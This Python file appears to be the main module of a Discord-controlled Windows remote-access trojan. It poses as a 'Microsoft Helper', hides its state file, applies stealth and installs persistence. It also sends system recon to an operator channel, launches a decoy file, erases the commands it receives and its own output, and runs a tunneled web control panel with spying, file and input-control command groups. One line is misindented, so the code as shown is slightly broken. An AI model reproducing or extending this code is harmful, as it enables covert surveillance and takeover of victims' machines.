import asyncio
import ctypes
import json
import os
import pathlib
import socket
import sys

import discord
from discord.ext import commands

from core import capture, collect, notify, persist, recon, stealth, util, web
from core.paths import BASE, config_path

# ------------------------------------------------------------ single instance
_MUTEX = None
if not any(a in sys.argv for a in ('--status', '--uninstall')):
    _k = ctypes.windll.kernel32
    _k.CreateMutexW.restype = ctypes.c_void_p
    _MUTEX = _k.CreateMutexW(None, False, 'Global\\MicrosoftHelper_MTX')
    if _k.GetLastError() == 183:
        sys.exit(0)

stealth.apply()

CFG = json.loads(config_path().read_text())
HOST = socket.gethostname().split('.')[0][:20]
util.TAG = f'`{HOST}` '
STATE = pathlib.Path(os.environ.get('APPDATA', '.')) / '.mshelper.json'


# ------------------------------------------------------------ cli
def _cli():
    if '--status' in sys.argv:
        ctypes.windll.user32.MessageBoxW(0, json.dumps(persist.status(), indent=2),
                                         'Microsoft Helper', 0x40)
        return True
    if '--uninstall' in sys.argv:
        persist.uninstall()
        return True
    if '--install' in sys.argv:
        persist.install()
        return '--no-run' in sys.argv
    return False


if _cli():
    sys.exit(0)


# ------------------------------------------------------------ bot
intents = discord.Intents.default()
intents.message_content = True
intents.dm_messages = True

bot = commands.Bot(command_prefix=CFG['prefix'], intents=intents,
                   help_command=None, case_insensitive=True)
bot.cfg = CFG

CATS = {'System': '🖥', 'Files': '📁', 'Spy': '👁', 'Control': '🖱', 'Net': '🌐'}


def help_embed(prefix):
    e = discord.Embed(title='commands', color=0x5865f2,
                      description=f'`{HOST}` · prefix `{prefix}`')
    for cog, cmds in bot.cogs.items():
        if cog not in CATS:
            continue
        lines = [f'`{prefix}{c.name}` — {(c.help or "").splitlines()[0][:60]}'
                 for c in cmds.get_commands()]
        e.add_field(name=f'{CATS[cog]} {cog}', value='\n'.join(lines)[:1020], inline=False)
    return e


@bot.command(name='help')
async def _help(ctx):
    await ctx.channel.send(embed=help_embed(ctx.prefix))


# ------------------------------------------------------------ panel wiring
async def _repost(url):
    await notify.repost(url, 'panel')


async def _tunnel_down(reason):
    await notify.down(reason)


async def _channel():
    try:
        return (bot.get_channel(int(CFG['channel_id']))
                or await bot.fetch_channel(int(CFG['channel_id'])))
    except Exception:
        return None


async def _start_panel():
    if not CFG.get('web_port') or web.running():
        return
    try:
        await web.start(CFG['web_port'], CFG.get('web_token', ''), CFG,
                        on_url=lambda u: asyncio.create_task(_repost(u)),
                        on_down=lambda r: asyncio.create_task(_tunnel_down(r)))
    except Exception as e:
        await notify.say(f'panel failed: `{e}`')


# ------------------------------------------------------------ replay
async def replay(ch):
    if not ch or not STATE.exists():
        return
    try:
        after = int(json.loads(STATE.read_text())['last'])
    except Exception:
        return
    async for m in ch.history(after=discord.Object(after), oldest_first=True, limit=100):
        await dispatch(m)


# ------------------------------------------------------------ ready
@bot.event
async def on_ready():
    ch = await _channel()
    notify.bind(bot, CFG['channel_id'])

    await replay(ch)

    if ch and CFG.get('info_on_start'):
        try:
            await recon.dump(ch)
        except Exception as e:
            await ch.send(f'{util.TAG}recon error: `{e}`')

   if CFG.get('auto_panel'):
        await _start_panel()
        if ch:
            u = web.current_url()
            if u:
                await notify.repost(u, 'panel')
    if ch:
        u = web.URL or web.lan_url()
        if u:
            await notify.repost(f'{u}/?k={CFG.get("web_token", "")}', 'panel')

    try:
        await bot.change_presence(activity=discord.Game(HOST))
    except Exception:
        pass

    if CFG.get('decoy'):
        await asyncio.to_thread(util.run, f'start "" "{CFG["decoy"]}"')

    print('online as', bot.user)


# ------------------------------------------------------------ messages
@bot.event
async def on_message(msg):
    if msg.author.bot:
        return
    if (msg.channel.type != discord.ChannelType.dm
            and msg.channel.id != int(CFG['channel_id'])):
        return
    if CFG['allowed_user_ids'] and msg.author.id not in CFG['allowed_user_ids']:
        return
    await dispatch(msg)


async def dispatch(msg):
    p = CFG['prefix']
    if not msg.content.startswith(p):
        return
    body = msg.content[len(p):]
    if body.startswith('@'):
        parts = body[1:].split(None, 1)
        if parts[0].lower() != HOST.lower():
            return
        msg.content = p + (parts[1] if len(parts) > 1 else '')
    try:
        if CFG.get('delete_commands'):
            await msg.delete()
    except Exception:
        pass
    try:
        await bot.process_commands(msg)
        STATE.write_text(json.dumps({'last': msg.id}))
        if CFG.get('output_delete_ms', 0) > 0:
            await asyncio.sleep(CFG['output_delete_ms'] / 1000)
            async for m in msg.channel.history(limit=12):
                if m.author.id == bot.user.id:
                    try:
                        await m.delete()
                    except Exception:
                        pass
    except Exception as e:
        await msg.channel.send(f'```{e}```')


# ------------------------------------------------------------ background
async def keep_awake():
    while True:
        try:
            ctypes.windll.kernel32.SetThreadExecutionState(0x80000001)
        except Exception:
            pass
        await asyncio.sleep(25)


async def panel_watch():
    while True:
        await asyncio.sleep(300)
        try:
            if CFG.get('web_port') and web.running() and not web.URL:
                await notify.say('panel tunnel lost — restarting')
                await web.stop()
                await _start_panel()
        except Exception:
            pass


# ------------------------------------------------------------ boot
async def main():
    for f in sorted((BASE / 'cogs').glob('*.py')):
        await bot.load_extension(f'cogs.{f.stem}')
    if CFG.get('keep_awake'):
        asyncio.create_task(keep_awake())
    asyncio.create_task(panel_watch())
    await bot.start(CFG['token'])


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass